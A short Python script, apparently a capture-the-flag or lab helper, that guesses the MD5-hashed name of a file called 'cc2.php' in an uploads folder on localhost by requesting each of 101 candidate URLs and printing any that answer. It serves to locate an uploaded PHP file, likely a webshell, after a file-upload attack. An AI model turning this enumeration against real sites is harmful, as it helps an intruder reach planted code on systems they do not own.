import requests
import hashlib
import time

def jisuan():
    for x in range(0,101):
        md5 = hashlib.md5()
        md5.update(('cc2.php'+str(x)).encode('utf-8'))
        md5_reuslt = md5.hexdigest()
        url = 'http://localhost:8000/uploads/{}'.format(md5_reuslt+'.php')
        print(url)
        r = requests.get(url=url)
        if r.status_code == 200:
            print("结果为：",url)
            # exit()
        # print(md5_reuslt)

if __name__ == "__main__":
    jisuan()